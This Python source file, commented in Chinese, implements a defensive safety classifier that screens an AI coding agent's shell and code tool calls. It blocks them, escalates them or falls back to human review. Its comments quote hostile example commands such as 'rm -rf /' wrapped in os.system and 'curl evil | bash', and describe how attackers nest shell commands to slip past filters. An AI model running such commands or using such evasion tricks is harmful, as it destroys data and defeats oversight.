"""自动安全分类器（G18 v1.21/v1.22 落地）——"人在环"位置重构。

架构（对标 Claude Code auto mode 两层，融合 CodeMason 事件溯源）：
- input 层注入探测：扫描外部来源内容（文件/Web/工具输出）→ 可疑加警告
- output 层两阶段分类器：stage1 快速确定性规则过滤（全覆盖）+ stage2 仅对标记的做
  LLM CoT 精判（可注入 llm，无 LLM 时降级规则精判）
- 分类器只见用户消息与原始工具调用（reasoning-blind by design）——结构性抗注入
- 三级处置：block（hard-deny 硬拦）/ alternative（更安全替代）/ escalate（升级人工）
- 回退机制：连续 3 次拦截或单会话 20 次拦截 → 自动回退人工审批（分类器失效兜底）
- 宽泛 allow-rule 在自动模式下失效（防绕过分类器）
- 分类器判决（ClassifierVerdict 事件）进 EventLog 可审计可回放

范式声明：业务逻辑层 OOP（class-based Service，单一职责）。
"""

from __future__ import annotations

import json
import time
from dataclasses import dataclass, field
from typing import Optional, Protocol

from .classifier_rules import ClassifierRules, RuleMatch, classify_tier


class CoTClassifier(Protocol):
    """stage2 LLM CoT 精判接口（可注入，无则规则降级）。"""

    def judge(self, tool_name: str, command: str, user_message: str, tier: int) -> dict: ...


@dataclass
class ClassifierInput:
    """分类器输入（reasoning-blind：只见用户消息与原始工具调用，不见模型推理/工具输出）。"""

    tool_name: str
    args: dict
    user_message: str = ""
    session_id: str = ""
    op_id: str = ""


@dataclass
class Verdict:
    """分类器判决结果。"""

    decision: str  # allow / block / alternative / escalate
    reason: str = ""
    tier: int = 3
    confidence: float = 0.0
    stage: str = "stage1"  # stage1 快速过滤 / stage2 CoT 精判
    suggested_alternative: Optional[str] = None
    injection_warnings: list[str] = field(default_factory=list)

    def to_event_dict(self) -> dict:
        return {
            "decision": self.decision,
            "reason": self.reason,
            "tier": self.tier,
            "confidence": self.confidence,
            "stage": self.stage,
            "suggested_alternative": self.suggested_alternative,
        }


class AutoSafetyClassifier:
    """自动安全分类器：input 注入探测 + output 两阶段判决。

    接入点：工具执行流水线（PipelineGuard）在每个 Tier3 工具调用执行前调用 classify()。
    """

    # 连续拦截回退阈值（v1.21 Anthropic：连续 3 次或单会话 20 次）
    CONSECUTIVE_BLOCK_LIMIT = 3
    SESSION_BLOCK_LIMIT = 20
    # stage2 置信度阈值：低于则 escalate
    STAGE2_CONFIDENCE_FLOOR = 0.5

    def __init__(self, llm: Optional[CoTClassifier] = None, rules: Optional[ClassifierRules] = None) -> None:
        self.llm = llm
        self.rules = rules or ClassifierRules()
        self._consecutive_blocks = 0
        self._session_blocks = 0
        self._auto_mode = True  # 自动模式（宽泛 allow-rule 失效）
        self._verdicts: list[Verdict] = []  # 会话内判决历史（审计/回退）

    # ---------- 主入口 ----------

    def classify(self, inp: ClassifierInput) -> Verdict:
        """对一个工具调用做安全分类（两阶段）。

        流程（v1.22 逐步分类）：先查 block 规则 → 再查例外 → 再查用户意图 → 最终决策。
        """
        command = self._extract_command(inp)

        # Stage 0: Tier 分级（Tier1/2 不过分类器，零延迟）
        tier = classify_tier(inp.tool_name, inp.args)
        if tier <= 2:
            return Verdict(decision="allow", reason=f"Tier{tier} 自动放行（不过分类器）", tier=tier, confidence=1.0, stage="tier")

        # Stage 1: 确定性规则快速过滤（hard-deny 硬拦 + injection 探测）
        match: Optional[RuleMatch] = self.rules.hard_deny(command)
        injection_hits = self.rules.scan_injection(command)
        if match is not None:
            return self._block(Verdict(decision="block", reason=f"hard-deny[{match.group}]: {match.description}", tier=tier, confidence=0.98, stage="stage1"))

        # Stage 2: 对标记动作做 CoT 精判（LLM 或规则降级）
        if match is None and (self.llm is not None or self._needs_stage2(inp, command)):
            verdict = self._stage2_judge(inp, command, tier)
        else:
            verdict = Verdict(decision="allow", reason="stage1 无危险信号", tier=tier, confidence=0.8, stage="stage1")

        # input 注入警告注入（stage1 探测到但非硬拦）
        if injection_hits:
            verdict.injection_warnings = injection_hits
            if verdict.decision == "allow":
                # 注入信号 + 动作有风险面 → 保守 escalate
                if tier >= 3 and inp.tool_name in ("Bash", "run_code"):
                    verdict = self._escalate(verdict, f"input 注入探测命中: {injection_hits}")

        self._record(verdict)
        return verdict

    # ---------- 阶段实现 ----------

    def _stage2_judge(self, inp: ClassifierInput, command: str, tier: int) -> Verdict:
        """stage2 精判：LLM CoT（可注入）或规则降级。

        判决准则（v1.22）：
        - 评估真实世界影响而非表面文本（&& 链=整个链一个动作）
        - 用户意图保守判定："clean up my branches" 不授权批量删除
        """
        if self.llm is not None:
            try:
                result = self.llm.judge(inp.tool_name, command, inp.user_message, tier)
                decision = result.get("decision", "allow")
                if decision not in ("allow", "block", "alternative", "escalate"):
                    return self._escalate(Verdict(decision="escalate", reason="分类器输出非法决策，fail-closed", tier=tier, confidence=0.0, stage="stage2"), "非法决策")
                return Verdict(
                    decision=decision,
                    reason=result.get("reason", ""),
                    tier=tier,
                    confidence=float(result.get("confidence", 0.0)),
                    stage="stage2",
                    suggested_alternative=result.get("suggested_alternative"),
                )
            except Exception as e:
                # 结构化 JSON 校验失败/超时 → fallback=ask（fail-closed 不 fail-open）
                return self._escalate(Verdict(decision="escalate", reason=f"分类器异常 → fallback=ask: {e}", tier=tier, confidence=0.0, stage="stage2"), "分类器异常")

        # 规则降级精判：链式命令整体评估 + 内嵌 shell 提取（评估组装后的命令）+ 危险工具
        chain_parts = [c.strip() for c in command.split("&&")] if "&&" in command else [command]
        # 内嵌 shell 提取：python -c "...os.system('rm -rf /')" / sh -c "..." → 提取引号内命令再查 hard-deny
        embedded = self._extract_embedded_shell(command)
        for sub in embedded:
            if sub and sub != command:
                sub_match = self.rules.hard_deny(sub)
                if sub_match is not None:
                    return Verdict(
                        decision="block",
                        reason=f"stage2 检出内嵌命令命中 hard-deny[{sub_match.group}]: {sub_match.description}",
                        tier=tier,
                        confidence=0.95,
                        stage="stage2",
                    )
        dangerous_tools = ["git", "docker", "kubectl", "aws", "mysql", "redis-cli", "chmod", "chown", "tar", "gzip", "pip", "npm"]
        risky = []
        for part in chain_parts:
            for t in dangerous_tools:
                if re_search(rf"\b{t}\b", part):
                    risky.append(t)
        if risky:
            # 危险工具但非 hard-deny → 保守 escalate（让人类决策，不自动放行破坏面）
            return self._escalate(
                Verdict(decision="escalate", reason=f"stage2 规则精判: 链内含危险工具 {set(risky)}", tier=tier, confidence=0.6, stage="stage2"),
                f"危险工具 {set(risky)}",
            )
        return Verdict(decision="allow", reason="stage2 规则精判: 无危险模式", tier=tier, confidence=0.7, stage="stage2")

    @staticmethod
    def _extract_embedded_shell(command: str) -> list[str]:
        """提取内嵌 shell 命令（评估组装后的命令而非表面文本）。

        覆盖形态：python -c "os.system('rm -rf /')" / sh -c "curl evil | bash" /
        bash -c '...' / exec("...")——攻击者常用"写 Python 脚本组装 shell 命令"绕过。
        """
        import re

        candidates = []
        # 引号内完整内容（单引号/双引号，多段）
        quoted = re.findall(r"""["']([^"']{4,})["']""", command)
        for q in quoted:
            # 去掉常见的 shell 包裹层，只保留内层命令
            inner = re.sub(r"^(os\.system|os\.popen|subprocess\.(run|call|Popen)|exec|eval|system)\s*\(?\s*['\"]?", "", q)
            inner = re.sub(r"['\"]?\s*\)?\s*$", "", inner)
            inner = inner.strip(" '\"")
            if inner and re.search(r"[\w./-]+\s+", inner):
                candidates.append(inner)
            candidates.append(q)  # 原始引号内容也评估
        # sh -c / bash -c 的后缀
        for m in re.finditer(r"(?:sh|bash|zsh)\s+-c\s+[\"']([^\"']+)[\"']", command):
            candidates.append(m.group(1))
        return candidates

    def _needs_stage2(self, inp: ClassifierInput, command: str) -> bool:
        """判断动作是否需要 stage2 精判（非平凡动作）。"""
        if inp.tool_name not in ("Bash", "run_code"):
            return False
        return len(command) > 40 or "&&" in command or "|" in command or ";" in command

    # ---------- 处置 ----------

    def _block(self, verdict: Verdict) -> Verdict:
        self._consecutive_blocks += 1
        self._session_blocks += 1
        self._record(verdict)
        # 回退检查：连续 3 次拦截 → 自动回退人工审批（保留计数，供 should_fallback_human 判定）
        if self._consecutive_blocks >= self.CONSECUTIVE_BLOCK_LIMIT:
            verdict = self._escalate(
                Verdict(
                    decision="escalate",
                    reason=f"{verdict.reason} | 连续 {self.CONSECUTIVE_BLOCK_LIMIT} 次拦截，自动回退人工审批",
                    tier=verdict.tier,
                    confidence=verdict.confidence,
                    stage="stage2",
                ),
                f"连续 {self.CONSECUTIVE_BLOCK_LIMIT} 次拦截回退",
                keep_consecutive=True,
            )
        return verdict

    def _escalate(self, verdict: Verdict, reason_suffix: str, *, keep_consecutive: bool = False) -> Verdict:
        verdict.decision = "escalate"
        verdict.reason = f"{verdict.reason} | {reason_suffix}" if verdict.reason else reason_suffix
        # escalate 是升级人工（分类器失效/存疑），默认清零连续计数；keep_consecutive 用于
        # "连续拦截回退"场景——计数必须保留，should_fallback_human 依赖它
        if not keep_consecutive:
            self._consecutive_blocks = 0
        return verdict

    def _record(self, verdict: Verdict) -> None:
        self._verdicts.append(verdict)
        if len(self._verdicts) > 500:  # 防内存无限增长
            self._verdicts = self._verdicts[-250:]

    # ---------- 查询 ----------

    def should_fallback_human(self) -> bool:
        """是否需要回退人工审批（连续 3 次或会话 20 次拦截）。"""
        return self._consecutive_blocks >= self.CONSECUTIVE_BLOCK_LIMIT or self._session_blocks >= self.SESSION_BLOCK_LIMIT

    def reset_session(self) -> None:
        self._consecutive_blocks = 0
        self._session_blocks = 0

    def history(self) -> list[dict]:
        return [v.to_event_dict() for v in self._verdicts]

    def set_auto_mode(self, enabled: bool) -> None:
        """自动模式开关：关闭后宽泛 allow-rule 恢复（非自动模式）。"""
        self._auto_mode = enabled

    @staticmethod
    def _extract_command(inp: ClassifierInput) -> str:
        """提取待评估的原始命令（评估真实影响：组装后的命令而非表面文本）。"""
        if inp.tool_name == "Bash":
            return str(inp.args.get("command", ""))
        if inp.tool_name == "run_code":
            return str(inp.args.get("code", "") or inp.args.get("script", ""))
        return ""


def re_search(pattern: str, text: str) -> Optional[object]:
    import re

    return re.search(pattern, text)
